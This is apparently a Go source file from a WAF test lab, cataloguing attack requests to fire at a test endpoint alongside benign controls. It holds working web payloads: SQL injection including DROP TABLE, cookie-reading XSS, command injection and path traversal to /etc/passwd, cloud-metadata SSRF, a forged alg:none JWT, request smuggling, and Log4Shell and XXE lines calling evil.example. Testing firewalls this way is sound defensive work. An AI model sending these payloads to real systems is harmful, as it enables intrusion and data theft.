package waflab

// Attack is one catalogue entry fired through POST /api/waf/test.
type Attack struct {
	ID          string
	Name        string
	Category    string
	Method      string
	Path        string
	Headers     map[string]string
	Body        string
	ContentType string
	ExpectBlock bool
	Notes       string
	Sets        []string // full is always implied; optional tags for FilterBySet
}

// forgedJWT is alg:none {"sub":"admin","role":"admin"} — matches test_waf_live.py.
const forgedJWT = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."

// Catalogue returns the live matrix aligned with wslproxy test_waf_live.py.
func Catalogue() []Attack {
	return []Attack{
		// SQLi (owasp_core)
		{ID: "sqli-union", Name: "SQL injection (UNION)", Category: "sqli", Method: "GET",
			Path: "/products?cat=x' UNION SELECT * FROM users--", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "sqli-select-from", Name: "SQL injection (SELECT FROM)", Category: "sqli", Method: "GET",
			Path: "/products?cat=select id from users", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "sqli-insert", Name: "SQL injection (INSERT)", Category: "sqli", Method: "GET",
			Path: "/products?cat=x'; INSERT INTO users VALUES(1)--", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "sqli-drop", Name: "SQL injection (DROP)", Category: "sqli", Method: "GET",
			Path: "/products?cat=x'; DROP TABLE users--", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "sqli-boolean", Name: "SQL injection (boolean)", Category: "sqli", Method: "GET",
			Path: "/products?cat=1 OR 1=1", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "sqli-time", Name: "SQL injection (time)", Category: "sqli", Method: "GET",
			Path: "/products?cat=1; SELECT SLEEP(1)", ExpectBlock: true, Sets: []string{"owasp_core"}},

		// XSS
		{ID: "xss-script", Name: "Reflected XSS (script)", Category: "xss", Method: "GET",
			Path: "/search?q=<script>alert(document.cookie)</script>", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "xss-javascript-uri", Name: "XSS javascript: URI", Category: "xss", Method: "GET",
			Path: "/search?q=javascript:alert(1)", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "xss-event-handler", Name: "XSS event handler", Category: "xss", Method: "GET",
			Path: "/search?q=<img src=x onerror=alert(1)>", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "xss-html-tag-src", Name: "XSS HTML tag src", Category: "xss", Method: "GET",
			Path: "/search?q=<img src=http://evil.example/x>", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "xss-dom-eval", Name: "XSS DOM eval", Category: "xss", Method: "GET",
			Path: "/search?q=eval(document.cookie)", ExpectBlock: true, Sets: []string{"owasp_core"}},

		// Command injection
		{ID: "cmdi-semicolon", Name: "OS command injection (;)", Category: "cmdi", Method: "GET",
			Path: "/ping?host=127.0.0.1;id", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "cmdi-pipe", Name: "OS command injection (|)", Category: "cmdi", Method: "GET",
			Path: "/ping?host=127.0.0.1|cat /etc/passwd", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "cmdi-backtick", Name: "OS command injection (backtick)", Category: "cmdi", Method: "GET",
			Path: "/ping?host=`id`", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "cmdi-subshell", Name: "OS command injection (subshell)", Category: "cmdi", Method: "GET",
			Path: "/ping?host=$(whoami)", ExpectBlock: true, Sets: []string{"owasp_core"}},

		// LFI
		{ID: "lfi-dotdot", Name: "Path traversal", Category: "lfi", Method: "GET",
			Path: "/statement?file=../../../../../../etc/passwd", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "lfi-passwd", Name: "LFI /etc/passwd", Category: "lfi", Method: "GET",
			Path: "/statement?file=/etc/passwd", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "lfi-encoded", Name: "Encoded traversal", Category: "lfi", Method: "GET",
			Path: "/statement?file=..%2f..%2f..%2fetc/passwd", ExpectBlock: true, Sets: []string{"owasp_core"}},

		// Protocol
		{ID: "proto-null-byte", Name: "Null byte injection", Category: "proto", Method: "GET",
			Path: "/products?cat=foo%00", ExpectBlock: true, Sets: []string{"owasp_core"}},
		{ID: "proto-crlf", Name: "CRLF injection", Category: "proto", Method: "GET",
			Path: "/products?cat=x%0d%0aX-Injected:1", ExpectBlock: true, Sets: []string{"owasp_core"}},

		// Modern / API
		{ID: "ssti-arithmetic", Name: "SSTI arithmetic", Category: "ssti", Method: "GET",
			Path: "/render?tpl={{7*7}}", ExpectBlock: true, Sets: []string{"modern_api"}},
		{ID: "ssti-config", Name: "SSTI config exfil", Category: "ssti", Method: "GET",
			Path: "/render?tpl={{config}}", ExpectBlock: true, Sets: []string{"modern_api"}},
		{ID: "log4shell-jndi", Name: "Log4Shell JNDI", Category: "log4shell", Method: "GET",
			Path: "/lookup?user=${jndi:ldap://evil.example/a}", ExpectBlock: true, Sets: []string{"modern_api"}},
		{ID: "log4shell-obfuscated", Name: "Log4Shell obfuscated", Category: "log4shell", Method: "GET",
			Path: "/lookup?user=${${lower:j}ndi:ldap://evil.example/a}", ExpectBlock: true, Sets: []string{"modern_api"}},
		{ID: "spring4shell", Name: "Spring4Shell", Category: "rce", Method: "GET",
			Path: "/bind?class.module.classLoader.URLs%5B0%5D=x", ExpectBlock: true, Sets: []string{"modern_api"}},
		{ID: "ssrf-metadata", Name: "SSRF cloud metadata", Category: "ssrf", Method: "GET",
			Path: "/fetch?url=http://169.254.169.254/latest/meta-data/", ExpectBlock: true, Sets: []string{"modern_api"}},
		{ID: "ssrf-gopher", Name: "SSRF gopher", Category: "ssrf", Method: "GET",
			Path: "/fetch?url=gopher://127.0.0.1:70/1", ExpectBlock: true, Sets: []string{"modern_api"}},
		{ID: "nosqli", Name: "NoSQL injection", Category: "nosqli", Method: "POST",
			Path: "/api/login", Body: `{"user":"admin","pass":{"$ne":null}}`,
			ContentType: "application/json", ExpectBlock: true, Sets: []string{"modern_api"}},
		{ID: "xxe", Name: "XXE", Category: "xxe", Method: "POST",
			Path: "/api/import",
			Body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.example/x">]><foo>&xxe;</foo>`,
			ContentType: "application/xml", ExpectBlock: true, Sets: []string{"modern_api"}},
		{ID: "jwt-alg-none", Name: "JWT alg:none", Category: "jwt", Method: "GET",
			Path: "/api/me", Headers: map[string]string{"Authorization": "Bearer " + forgedJWT},
			ExpectBlock: true, Sets: []string{"modern_api"}},
		{ID: "proto-pollution", Name: "Prototype pollution", Category: "proto_pollution", Method: "POST",
			Path: "/api/merge", Body: `{"__proto__":{"admin":true}}`,
			ContentType: "application/json", ExpectBlock: true, Sets: []string{"modern_api"}},
		{ID: "graphql-introspection", Name: "GraphQL introspection", Category: "graphql", Method: "POST",
			Path: "/graphql",
			Body:        `{"query":"query IntrospectionQuery {__schema {types {name}}}"}`,
			ContentType: "application/json", ExpectBlock: true, Sets: []string{"modern_api"}},
		{ID: "scanner-ua", Name: "Scanner User-Agent", Category: "scanner", Method: "GET",
			Path: "/products?cat=deposit",
			Headers:     map[string]string{"User-Agent": "sqlmap/1.7.11#stable (https://sqlmap.org)"},
			ExpectBlock: true, Sets: []string{"modern_api"},
			Notes: "Relay can set UA; browser scripts often cannot"},
		{ID: "cmdi-json-chain", Name: "CMDi in JSON body", Category: "cmdi", Method: "POST",
			Path: "/api/login", Body: `{"user":"a","pass":"x; id"}`,
			ContentType: "application/json", ExpectBlock: true, Sets: []string{"modern_api"}},
		{ID: "mass-assignment", Name: "Mass assignment", Category: "mass_assignment", Method: "POST",
			Path: "/api/profile", Body: `{"user":"me","role":"admin"}`,
			ContentType: "application/json", ExpectBlock: true, Sets: []string{"modern_api"}},
		{ID: "http-request-smuggling", Name: "HTTP request smuggling", Category: "smuggling", Method: "POST",
			Path: "/api/batch",
			Body:        "{\"batch\":\"noop\"}\r\n0\r\n\r\nGET /api/accounts/9999 HTTP/1.1\r\nHost: x\r\n\r\n",
			ContentType: "text/plain", ExpectBlock: true, Sets: []string{"modern_api"},
			Notes: "smuggled request line in body (CWE-444)"},

		// v2 stages
		{ID: "v2-filetype", Name: "v2 filetype deny (.env)", Category: "v2_stage", Method: "GET",
			Path: "/config.env", ExpectBlock: true, Sets: []string{"stages_only"}},
		{ID: "v2-method", Name: "v2 method violation (PUT)", Category: "v2_stage", Method: "PUT",
			Path: "/api/profile", Body: `{"user":"me"}`, ContentType: "application/json",
			ExpectBlock: true, Sets: []string{"stages_only"}},

		// Controls — ExpectBlock=false
		{ID: "benign-products", Name: "Benign products query", Category: "benign", Method: "GET",
			Path: "/products?cat=deposit", ExpectBlock: false},
		{ID: "benign-home", Name: "Benign home", Category: "benign", Method: "GET",
			Path: "/", ExpectBlock: false},
		{ID: "bola-idor-business-logic", Name: "BOLA / IDOR", Category: "bola", Method: "GET",
			Path: "/api/accounts/9999", ExpectBlock: false,
			Notes: "signature WAF cannot stop object-level authz flaws — by design"},
	}
}

// FilterBySet returns attacks for full|owasp_core|modern_api|stages_only.
// Benign + BOLA controls are always included so false-positive detection works.
func FilterBySet(set string) []Attack {
	all := Catalogue()
	set = normalizeSet(set)
	if set == "full" {
		return all
	}
	out := make([]Attack, 0, len(all))
	for _, a := range all {
		if a.Category == "benign" || a.Category == "bola" {
			out = append(out, a)
			continue
		}
		if attackInSet(a, set) {
			out = append(out, a)
		}
	}
	return out
}

func normalizeSet(set string) string {
	switch set {
	case "", "full":
		return "full"
	case "owasp_core", "modern_api", "stages_only":
		return set
	default:
		return "full"
	}
}

func attackInSet(a Attack, set string) bool {
	for _, s := range a.Sets {
		if s == set {
			return true
		}
	}
	return false
}

// CatalogueIDs returns attack IDs in catalogue order (for drift tests).
func CatalogueIDs() []string {
	all := Catalogue()
	ids := make([]string, len(all))
	for i, a := range all {
		ids[i] = a.ID
	}
	return ids
}
